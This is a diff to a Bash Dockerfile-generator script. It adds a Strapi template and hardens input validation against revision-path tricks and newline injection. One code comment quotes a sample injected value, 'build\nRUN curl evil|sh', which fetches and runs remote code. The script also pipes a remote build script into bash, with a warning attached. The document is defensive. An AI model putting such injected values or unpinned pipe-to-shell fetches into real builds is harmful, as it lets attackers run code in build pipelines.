@@ -5,6 +5,14 @@ set -euo pipefail
 # If base revision was set, we are going to use given revision
 # BASE_REVISION="db70372fd4ecbc111cb195ebe249809d8f0768a3" curl -sL https://...
 BASE_REVISION="${BASE_REVISION:-main}"
+# Validate BASE_REVISION before it is interpolated into any fetch URL. Accept only
+# a git commit SHA, tag, or branch name; reject shell metacharacters and any '..'
+# sequence (curl normalizes '../' in URL paths and could be repointed at an
+# arbitrary repo/path). See SECURITY.md.
+if [[ ! "$BASE_REVISION" =~ ^[A-Za-z0-9][A-Za-z0-9._/-]*$ || "$BASE_REVISION" == *..* ]]; then
+  echo "Error: invalid BASE_REVISION '${BASE_REVISION}'. Use a commit SHA, tag, or branch name (chars [A-Za-z0-9._/-], no '..')." >&2
+  exit 1
+fi
 BASE_URL="https://raw.githubusercontent.com/orochi-network/dev-off/${BASE_REVISION}"
 
 # ============================================================================
@@ -24,6 +32,11 @@ RUNNER_WORKDIR="/home/node/app"
 # CLI variables
 # ============================================================================
 DOCKER_TEMPLATE=""
+# Which remote build script the generated Dockerfile fetches
+# (build-prod-${BUILD_SCRIPT_TEMPLATE}.sh). Defaults to the template name; a
+# template whose build is identical to another's can point at the shared script
+# (e.g. strapi reuses build-prod-node.sh). Set in the per-template case block.
+BUILD_SCRIPT_TEMPLATE=""
 DOCKER_FILE=()
 DOCKER_COMMAND="[\"npm\", \"start\"]"
 BUILD_COMMAND=""
@@ -38,7 +51,7 @@ UNKNOWN_ARGS=()
 
 # Templates that this script knows how to generate. Add new templates here and
 # extend the "Template-specific overrides" case below. See DOCKERFILE.md.
-SUPPORTED_TEMPLATES=("node" "nginx" "next")
+SUPPORTED_TEMPLATES=("node" "nginx" "next" "strapi")
 
 show_help() {
   cat <<EOF
@@ -47,12 +60,13 @@ Usage: ./dockerfile.sh [OPTIONS]
 Generate Dockerfile for Node.js projects with customizable runner stages.
 
 Options:
-  -t, --template TYPE        Template type: node, nginx, next
+  -t, --template TYPE        Template type: node, nginx, next, strapi
   -c, --command CMD          CMD to run (default: ["npm", "start"])
   -f, --file FILE            File/directory to copy (can be used multiple times)
                              Format: "file" or "src;dst" for custom paths
   -b, --build CMD            Custom build command (default: uses build-prod.sh)
-  -r, --runner-image IMAGE   Custom runner image (default: node:24-alpine for node/next)
+  -r, --runner-image IMAGE   Custom runner image (default: node:24-alpine for node/next,
+                             node:22-trixie-slim for strapi)
   -e, --env-file FILE        Copy specified .env file as .env before build
   --run CMD                  RUN command to execute in runner stage (repeatable)
   --dry-run                  Print Dockerfile to stdout instead of writing to file
@@ -105,6 +119,13 @@ Available templates:
            Builder: orochinetwork/ubuntu:node
            Runner: nginx:stable-alpine
            Build output: build/ directory
+
+  strapi  - Strapi headless CMS application
+           Builder: orochinetwork/ubuntu:node (corepack enabled for Yarn 4)
+           Runner: node:22-trixie-slim (default — glibc, REQUIRED for sharp/libvips)
+           Default CMD: ["npm", "run", "start"] (EXPOSE 1337, NODE_ENV=production)
+           Files to copy: config/, src/, database/, public/, types/, dist/,
+                          .strapi/, tsconfig.json, package.json, node_modules/, etc.
 
 Note: 'rust' is not implemented yet. To add a new template, see the
 "Adding a new template" section in DOCKERFILE.md.
@@ -191,6 +212,21 @@ if [[ "$TEMPLATE_OK" != true ]]; then
   exit 1
 fi
 
+# Reject control characters in any user-supplied value. Without this, a value
+# such as $'build\nRUN curl evil|sh' would inject extra directives into the
+# generated Dockerfile: the perl/$ENV{...} pass and the line-oriented emitters
+# (generate_copy_instructions, generate_runner_commands) treat an embedded
+# newline as the start of a new Dockerfile line. See SECURITY.md.
+contains_control_char() { [[ "$1" == *$'\n'* || "$1" == *$'\r'* ]]; }
+for v in "$DOCKER_COMMAND" "$BUILD_COMMAND" "$RUNNER_IMAGE" "$ENV_FILE" \
+  "${DOCKER_FILE[@]+"${DOCKER_FILE[@]}"}" \
+  "${RUNNER_COMMANDS[@]+"${RUNNER_COMMANDS[@]}"}"; do
+  if contains_control_char "$v"; then
+    echo "Error: argument values may not contain newlines or carriage returns." >&2
+    exit 1
+  fi
+done
+
 # Refuse to copy credential files into any image layer (defense-in-depth against
 # leaking npm/registry tokens from the builder into the runner image). Both the
 # source and the destination name are checked, case-insensitively, so neither
@@ -202,6 +238,14 @@ is_credential_name() {
   esac
 }
 for item in "${DOCKER_FILE[@]+"${DOCKER_FILE[@]}"}"; do
+  # At most one ';' may separate src from dst. More than one is ambiguous: this
+  # guard reads dst as the last field while the COPY generator reads it as the
+  # second field, so they would disagree on what is being copied. Reject it.
+  semicolons="${item//[^;]/}"
+  if [[ "${#semicolons}" -gt 1 ]]; then
+    echo "Error: -f value '${item}' contains more than one ';' (use 'src' or 'src;dst')." >&2
+    exit 1
+  fi
   src="${item%%;*}"
   dst="${item##*;}" # equals src when there is no ';'
   for name in "$src" "$dst"; do
@@ -227,6 +271,9 @@ check_file() {
 # ============================================================================
 # Template-specific overrides
 # ============================================================================
+# Default the remote build script to this template's own; a case branch may
+# repoint it at a shared script.
+BUILD_SCRIPT_TEMPLATE="$DOCKER_TEMPLATE"
 case "$DOCKER_TEMPLATE" in
 node)
   RUNNER_BASE_IMAGE="${RUNNER_IMAGE:-node:24-alpine}"
@@ -239,6 +286,10 @@ nginx)
   RUNNER_WORKDIR="/usr/share/nginx/html"
   DOCKER_COMMAND="[\"nginx\", \"-g\", \"daemon off;\"]"
   EXPOSE_PORT=$'\nEXPOSE 80'
+  # NOTE: nginx runs as the non-root 'nginx' user (USER nginx). Binding :80 then
+  # requires the host kernel to allow it (net.ipv4.ip_unprivileged_port_start=0,
+  # the default on Docker Desktop). On a stock-kernel Linux host (threshold 1024)
+  # a non-root master cannot bind :80; switch this and configs/nginx.conf to 8080.
   # Fix permissions for non-root nginx: create cache dirs, relocate pid, disable 'user' directive
   RUNNER_COMMANDS+=("mkdir -p /var/cache/nginx/client_temp /var/cache/nginx/proxy_temp /var/cache/nginx/fastcgi_temp /var/cache/nginx/uwsgi_temp /var/cache/nginx/scgi_temp && chown -R nginx:nginx /var/cache/nginx && sed -i 's|^user  nginx;|# user  nginx;|' /etc/nginx/nginx.conf && sed -i 's|pid */run/nginx.pid;|pid /tmp/nginx.pid;|' /etc/nginx/nginx.conf")
   # For nginx, if no files specified, use default build directory
@@ -250,6 +301,31 @@ next)
   RUNNER_BASE_IMAGE="${RUNNER_IMAGE:-node:24-alpine}"
   EXTRA_ENV=$'\nENV NEXT_TELEMETRY_DISABLED=1'
   COREPACK_ENABLE="corepack enable"
+  ;;
+strapi)
+  # Runner DEFAULTS to a glibc image (node:22-trixie-slim), NOT alpine/musl:
+  # Strapi's native sharp/libvips are built against glibc and break at runtime on
+  # musl. A -r/RUNNER_IMAGE override is still honored (use a glibc image).
+  RUNNER_BASE_IMAGE="${RUNNER_IMAGE:-node:22-trixie-slim}"
+  # NODE_ENV=production so Strapi serves the prebuilt admin panel and skips dev
+  # tooling at runtime.
+  EXTRA_ENV=$'\nENV NODE_ENV=production'
+  # The base image ships Yarn 1; Strapi projects use Yarn 4 berry, so corepack
+  # must be enabled to run the pinned package manager. corepack is enabled by the
+  # dedicated builder RUN layer (COREPACK_ENABLE) before the build script runs.
+  COREPACK_ENABLE="corepack enable"
+  # A Strapi build IS a node build: immutable install + `yarn build` (which runs
+  # `strapi build`). Reuse the shared build-prod-node.sh instead of a duplicate
+  # per-template script. The Strapi-specific bits (glibc runner, corepack layer,
+  # copy set, NODE_ENV/EXPOSE/CMD) all live in this case block.
+  BUILD_SCRIPT_TEMPLATE="node"
+  DOCKER_COMMAND="[\"npm\", \"run\", \"start\"]"
+  EXPOSE_PORT=$'\nEXPOSE 1337'
+  # Sensible default runtime copy set for a built Strapi app (overridable via -f).
+  # tsconfig.json is load-bearing: Strapi reads its outDir to locate dist/.
+  if [[ ${#DOCKER_FILE[@]} -eq 0 ]]; then
+    DOCKER_FILE=(config src database public types dist .strapi tsconfig.json package.json node_modules favicon.png)
+  fi
   ;;
 esac
 
@@ -305,7 +381,7 @@ generate_build_command() {
     echo "         will fetch and execute the build script from dev-off at build time." >&2
     echo "         Pin BASE_REVISION to a commit SHA, or commit scripts/build-prod.sh," >&2
     echo "         to avoid trusting a moving branch. See SECURITY.md." >&2
-    local build_script="${BASE_URL}/scripts/build-prod-${DOCKER_TEMPLATE}.sh"
+    local build_script="${BASE_URL}/scripts/build-prod-${BUILD_SCRIPT_TEMPLATE}.sh"
     inner="curl -fsSL ${build_script} | bash -eo pipefail"
   fi
 
@@ -315,19 +391,20 @@ generate_build_command() {
   # lets the non-root builder user read the mounted secret. If the build fails,
   # `set -e` aborts the RUN (no layer is committed → still no leak).
   # Emit the Dockerfile lines with printf '%s\n' so the literal \n / \" escape
-  # sequences pass through verbatim (the builder's /bin/sh dash echo interprets
-  # them at image-build time, matching the original template).
+  # sequences pass through verbatim to the generated Dockerfile. Multi-line
+  # .yarnrc.yml writes use `printf` at build time (POSIX printf interprets \n in
+  # every shell), not `echo` (whose \n handling depends on the builder's /bin/sh).
   local h="/home/${BUILDER_USER}"
   printf '%s\n' "# Build with npm auth mounted as a secret (token never persists in a layer)"
   printf '%s\n' "RUN --mount=type=secret,id=npm_access_token,mode=0444 set -eu && \\"
   printf '%s\n' "  NPM_ACCESS_TOKEN=\$(cat /run/secrets/npm_access_token) && \\"
   printf '%s\n' "  echo \"//registry.npmjs.org/:_authToken=\$NPM_ACCESS_TOKEN\" > ${h}/.npmrc && \\"
-  printf '%s\n' "  echo \"enableTelemetry: false\\nnodeLinker: node-modules\\nnpmScopes:\" > ${h}/.yarnrc.yml && \\"
+  printf '%s\n' "  printf 'enableTelemetry: false\\nnodeLinker: node-modules\\nnpmScopes:\\n' > ${h}/.yarnrc.yml && \\"
   printf '%s\n' "  echo \"  orochi-network:\" >> ${h}/.yarnrc.yml && \\"
-  printf '%s\n' "  echo \"    npmRegistryServer: \\\"https://registry.npmjs.org\\\"\\n    npmAlwaysAuth: true\" >> ${h}/.yarnrc.yml && \\"
+  printf '%s\n' "  printf '    npmRegistryServer: \"https://registry.npmjs.org\"\\n    npmAlwaysAuth: true\\n' >> ${h}/.yarnrc.yml && \\"
   printf '%s\n' "  echo \"    npmAuthToken: \$NPM_ACCESS_TOKEN\" >> ${h}/.yarnrc.yml && \\"
   printf '%s\n' "  echo \"  zkdb:\" >> ${h}/.yarnrc.yml && \\"
-  printf '%s\n' "  echo \"    npmRegistryServer: \\\"https://registry.npmjs.org\\\"\\n    npmAlwaysAuth: true\" >> ${h}/.yarnrc.yml && \\"
+  printf '%s\n' "  printf '    npmRegistryServer: \"https://registry.npmjs.org\"\\n    npmAlwaysAuth: true\\n' >> ${h}/.yarnrc.yml && \\"
   printf '%s\n' "  echo \"    npmAuthToken: \$NPM_ACCESS_TOKEN\" >> ${h}/.yarnrc.yml && \\"
   printf '%s\n' "  { ${inner} ; } && \\"
   printf '%s\n' "  rm -f ${h}/.npmrc ${h}/.yarnrc.yml"
